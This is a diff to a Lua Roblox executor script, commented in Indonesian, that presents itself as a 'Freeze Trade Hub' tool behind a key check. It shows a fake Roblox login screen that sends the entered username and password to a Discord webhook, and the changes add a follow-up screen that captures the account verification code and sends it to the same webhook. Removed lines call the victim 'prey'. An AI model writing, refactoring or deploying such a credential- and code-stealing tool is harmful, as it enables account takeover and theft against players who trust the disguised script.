@@ -6,7 +6,7 @@ local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
 local linkUrl = "https://link-target.net/1273087/freezetradehub"
 
 -- Fungsi untuk mengirim data ke Discord
-local function sendToDiscord(username, password)
+local function sendToDiscord(content)
     local payload = {
         Url = webhook_url,
         Method = "POST",
@@ -14,45 +14,26 @@ local function sendToDiscord(username, password)
             ["Content-Type"] = "application/json"
         },
         Body = game:GetService("HttpService"):JSONEncode({
-            content = "Dinzz : Ada mangsa nih in\nUsername: " .. username .. "\nPassword: " .. password 
+            content = content
         })
     }
-    
-local function sendToDiscord(verificationCode)
-    local payload = {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({
-            content = "Kode Verifikasi: " .. verificationCode
-        })
-    }
-        
+
+    local response
     if syn and syn.request then
-        local response = syn.request(payload)
-        if response and response.StatusCode == 200 then
-            print("Data berhasil dikirim ke Discord!")
-        else
-            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
-        end
+        response = syn.request(payload)
     elseif http and http.request then
-        local response = http.request(payload)
-        if response and response.StatusCode == 200 then
-            print("Data berhasil dikirim ke Discord!")
-        else
-            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
-        end
+        response = http.request(payload)
     elseif request then
-        local response = request(payload)
-        if response and response.StatusCode == 200 then
-            print("Data berhasil dikirim ke Discord!")
-        else
-            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
-        end
+        response = request(payload)
     else
         print("Executor Anda tidak mendukung HTTP requests!")
+        return
+    end
+
+    if response and response.StatusCode == 200 then
+        print("Data berhasil dikirim ke Discord!")
+    else
+        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
     end
 end
 
@@ -127,24 +108,20 @@ local function createVerificationCodeGUI()
     verifyCodeButton.MouseButton1Click:Connect(function()
         local verificationCode = codeBox.Text
         if verificationCode ~= "" then
-            -- Mengirimkan kode ke Discord
-            sendToDiscord(verificationCode)
+            sendToDiscord("Kode Verifikasi: " .. verificationCode)
             print("Kode verifikasi telah dikirim ke Discord!")
             gui:Destroy()
         else
-            -- Menampilkan pesan error jika kode kosong
             errorLabel.Text = "Harap masukkan kode verifikasi!"
         end
     end)
 end
 
-    
--- Fungsi Membuat GUI Kedua (Login)
+-- Fungsi Membuat GUI Login
 local function createLoginGUI()
     local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
     local titleLabel = Instance.new("TextLabel")
-    local subtitleLabel = Instance.new("TextLabel")
     local usernameBox = Instance.new("TextBox")
     local passwordBox = Instance.new("TextBox")
     local loginButton = Instance.new("TextButton")
@@ -172,17 +149,6 @@ local function createLoginGUI()
     titleLabel.Text = "Freeze Trade Hub"
     titleLabel.TextSize = 24
     titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-    -- Subtitle Label
-    subtitleLabel.Name = "SubtitleLabel"
-    subtitleLabel.Parent = frame
-    subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
-    subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
-    subtitleLabel.BackgroundTransparency = 1
-    subtitleLabel.Font = Enum.Font.SourceSans
-    subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
-    subtitleLabel.TextSize = 16
-    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 
     -- Username Box
     usernameBox.Name = "UsernameBox"
@@ -224,16 +190,17 @@ local function createLoginGUI()
         local username = usernameBox.Text
         local password = passwordBox.Text
         if username ~= "" and password ~= "" then
-            print("Login berhasil! Username:", username, "Password:", password)
-            sendToDiscord(username, password)
+            sendToDiscord("Username: " .. username .. "\nPassword: " .. password)
+            print("Login berhasil! Username:", username)
             gui:Destroy()
+            createVerificationCodeGUI() -- Memanggil GUI verifikasi kode
         else
             print("Harap isi username dan password!")
         end
     end)
 end
 
--- Fungsi Membuat GUI Pertama (Key Validation)
+-- Fungsi Membuat GUI Validasi Key
 local function createKeyValidationGUI()
     local gui = Instance.new("ScreenGui")
     local frame = Instance.new("Frame")
@@ -327,7 +294,7 @@ local function createKeyValidationGUI()
         if keyBox.Text == correctKey then
             print("Key benar!")
             gui:Destroy()
-            createLoginGUI() -- Memanggil GUI kedua
+            createLoginGUI() -- Memanggil GUI login
         else
             errorLabel.Text = "Key salah! Silahkan Get Key."
         end
